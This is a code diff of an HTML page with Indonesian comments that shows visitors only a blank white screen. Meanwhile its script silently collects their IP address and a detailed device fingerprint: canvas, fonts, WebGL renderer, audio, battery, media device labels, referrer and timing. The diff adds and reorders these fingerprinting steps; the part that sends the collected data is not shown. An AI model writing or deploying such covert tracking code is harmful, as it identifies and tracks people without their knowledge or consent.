@@ -31,7 +31,7 @@
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // Info browser dan OS
+                // Info browser dan OS sederhana
                 const userAgent = navigator.userAgent;
                 let browser = "Unknown";
                 let os = "Unknown";
@@ -88,6 +88,18 @@
                     document.body.removeChild(el);
                 });
 
+                // WebGL Fingerprint
+                let webglInfo = "Unknown";
+                try {
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        webglInfo = debugInfo ? `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}` : "No WebGL";
+                    }
+                } catch (e) {
+                    webglInfo = "WebGL Error";
+                }
+
                 // AudioContext Fingerprint
                 let audioHash = "Unknown";
                 try {
@@ -98,64 +110,28 @@
                     const compressor = audioCtx.createDynamicsCompressor();
                     oscillator.connect(compressor);
                     compressor.connect(audioCtx.destination);
-                    audioHash = `${oscillator.type}_${compressor.threshold.value}`; // Basic hash
-                    oscillator.start();
-                    oscillator.stop(audioCtx.currentTime + 0.01); // Stop immediately
+                    audioHash = `${compressor.threshold.value}|${compressor.knee.value}`;
+                    audioCtx.close();
                 } catch (e) {
-                    audioHash = "AudioContext not supported";
+                    audioHash = "Audio Error";
                 }
 
-                // WebGL Info
-                let webglInfo = "Unknown";
-                try {
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        webglInfo = debugInfo ? 
-                            `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}|${
-                            gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}` : "WebGL no debug";
-                    }
-                } catch (e) {
-                    webglInfo = "WebGL not supported";
-                }
-
-                // Battery Status (kalo supported)
+                // Battery Status (kalo tersedia)
                 let batteryInfo = "Unknown";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    batteryInfo = {
-                        level: battery.level,
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
+                    batteryInfo = `${battery.level * 100}% | ${battery.charging ? 'Charging' : 'Not Charging'}`;
                 }
-
-                // Performance Timings
-                const performanceTiming = performance.getEntriesByType('navigation')[0] || {};
-                const loadTime = performanceTiming.loadEventEnd ? 
-                    performanceTiming.loadEventEnd - performanceTiming.startTime : "Unknown";
 
                 // Media Devices Enumeration
                 let mediaDevices = "Unknown";
                 if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                     const devices = await navigator.mediaDevices.enumerateDevices();
-                    mediaDevices = devices.map(device => ({
-                        kind: device.kind,
-                        label: device.label || "No label",
-                        deviceId: device.deviceId
-                    }));
+                    mediaDevices = devices.map(d => `${d.kind}:${d.label || 'No Label'}`).join(', ');
                 }
 
-                // Storage Quota Estimate
-                let storageQuota = "Unknown";
-                if (navigator.storage && navigator.storage.estimate) {
-                    const estimate = await navigator.storage.estimate();
-                    storageQuota = {
-                        usage: estimate.usage,
-                        quota: estimate.quota
-                    };
-                }
+                // Performance Timings
+                const performanceTiming = performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : "Unknown";
 
                 // Timestamp di GMT+7 (Asia/Jakarta)
                 const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
@@ -174,14 +150,13 @@
                     language: language,
                     canvasHash: canvasHash,
                     installedFonts: fonts.join(', '),
-                    audioHash: audioHash,
-                    webglInfo: webglInfo,
-                    batteryInfo: batteryInfo,
                     referrer: document.referrer,
                     connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
-                    loadTime: loadTime,
+                    webglInfo: webglInfo,
+                    audioHash: audioHash,
+                    batteryInfo: batteryInfo,
                     mediaDevices: mediaDevices,
-                    storageQuota: storageQuota,
+                    performanceTiming: performanceTiming,
                     timestamp: timestamp
                 };
 
@@ -199,4 +174,4 @@
 <body>
     <!-- Blank putih, kosong -->
 </body>
-    </html>
+</html>
